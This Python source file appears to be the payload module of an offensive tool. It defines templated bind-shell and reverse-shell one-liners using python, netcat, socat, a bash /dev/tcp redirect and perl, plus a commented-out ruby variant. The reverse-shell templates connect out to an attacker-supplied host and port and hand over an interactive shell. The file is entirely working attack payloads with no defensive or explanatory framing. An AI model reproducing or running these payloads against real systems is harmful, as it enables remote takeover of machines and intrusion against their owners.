
printf = """printf '%(s1)s'"""

bind_shell = [
    """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("%(shell)s");s.close()'""",
    """nc -l -p %(port)s -e %(shell)s""",
    """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f""",
    """socat tcp-l:%(port)s exec:%(shell)s"""
]

reverse_shell = [
    """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc %(host)s %(port)s >/tmp/f""",
    """sleep 1; nc -e %(shell)s %(host)s %(port)s""",
    """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%(shell)s","-i"]);'""",
    "sleep 1; /bin/bash -c \'%(shell)s 0</dev/tcp/%(host)s/%(port)s 1>&0 2>&0\'",
    """perl -e 'use Socket;$i="%(host)s";$p=%(port)s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%(shell)s -i");};'""",
# TODO: ruby payload's broken, fix it.
#    """ruby -rsocket -e'f=TCPSocket.open("%(host)s",%(port)s).to_i;exec sprintf("%(shell)s -i <&%%d >&%%d 2>&%%d",f,f,f)'""",
    """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("%(shell)s");'""",
]
